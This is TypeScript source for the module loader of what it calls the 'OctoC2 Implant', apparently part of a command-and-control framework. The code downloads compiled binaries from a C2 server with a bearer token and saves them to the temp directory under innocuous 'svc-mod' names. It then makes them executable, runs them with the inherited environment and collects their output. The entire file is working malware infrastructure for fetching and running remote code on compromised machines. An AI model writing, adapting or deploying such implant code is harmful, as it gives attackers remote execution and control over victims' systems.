/**
 * OctoC2 Implant — ModuleLoader
 *
 * Fetches a compiled module binary from the C2 server and executes it
 * as a subprocess. Modules receive context via SVC_* environment
 * variables and write one JSON line to stdout:
 *
 *   { "status": "ok"|"error", "data"?: string, "error"?: string }
 *
 * The module exits 0 on success or non-zero on failure.
 */

import { join }   from "node:path";
import { tmpdir } from "node:os";
import { chmod }  from "node:fs/promises";

const MODULE_TIMEOUT_MS = 30_000;

export class ModuleLoader {
  /**
   * Fetch a module binary from the C2 server.
   * Returns the path to the written executable (in OS temp dir).
   */
  static async fetchModule(
    name:     string,
    serverUrl: string,
    token:    string,
    beaconId: string,
  ): Promise<string> {
    const url = `${serverUrl}/api/modules/${beaconId}/${name}`;
    const res = await fetch(url, { headers: { Authorization: `Bearer ${token}` } });

    if (!res.ok) {
      throw new Error(`ModuleLoader: fetch failed: ${res.status}`);
    }

    const data     = new Uint8Array(await res.arrayBuffer());
    const destPath = join(tmpdir(), `svc-mod-${beaconId}-${name}`);

    await Bun.write(destPath, data);
    await chmod(destPath, 0o755);

    return destPath;
  }

  /**
   * Execute a module binary. Captures the first JSON line from stdout.
   * @param binaryPath  Path to the executable
   * @param pid         Current process PID — injected as SVC_PID
   */
  static async runModule(
    binaryPath: string,
    pid:        number,
  ): Promise<{ success: boolean; output: string }> {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    let proc: any | undefined;

    try {
      proc = Bun.spawn([binaryPath], {
        stdout: "pipe",
        stderr: "pipe",
        env: {
          ...process.env,
          SVC_PID: String(pid),
        },
      });
    } catch (err) {
      return {
        success: false,
        output:  `ModuleLoader: spawn failed: ${(err as Error).message}`,
      };
    }

    let timeoutId: ReturnType<typeof setTimeout> | undefined;

    const firstLine = await Promise.race([
      readFirstLine(proc.stdout as ReadableStream<Uint8Array>),
      new Promise<string>((resolve) => {
        timeoutId = setTimeout(() => {
          try { proc!.kill("SIGKILL"); } catch { /* already exited */ }
          resolve("");
        }, MODULE_TIMEOUT_MS);
      }),
    ]);

    if (timeoutId !== undefined) clearTimeout(timeoutId);

    if (!firstLine.trim()) {
      return { success: false, output: "[exit: module produced no output]" };
    }

    let parsed: { status?: string; data?: string; error?: string; [k: string]: unknown };
    try {
      parsed = JSON.parse(firstLine) as typeof parsed;
    } catch {
      return {
        success: false,
        output:  `Module output was not valid JSON: ${firstLine.trim()}`,
      };
    }

    if (parsed.status === "error") {
      return { success: false, output: parsed.error ?? "Module reported error" };
    }
    if (parsed.status === "ok") {
      return { success: true, output: parsed.data ?? firstLine.trim() };
    }
    return { success: true, output: firstLine.trim() };
  }
}

async function readFirstLine(
  stream: ReadableStream<Uint8Array> | null
): Promise<string> {
  if (!stream) return "";

  const reader  = stream.getReader();
  const decoder = new TextDecoder("utf-8", { fatal: false });
  let buffer    = "";

  try {
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      buffer += decoder.decode(value, { stream: true });
      const nl = buffer.indexOf("\n");
      if (nl !== -1) return buffer.slice(0, nl);
    }
  } finally {
    reader.releaseLock();
  }

  return buffer;
}
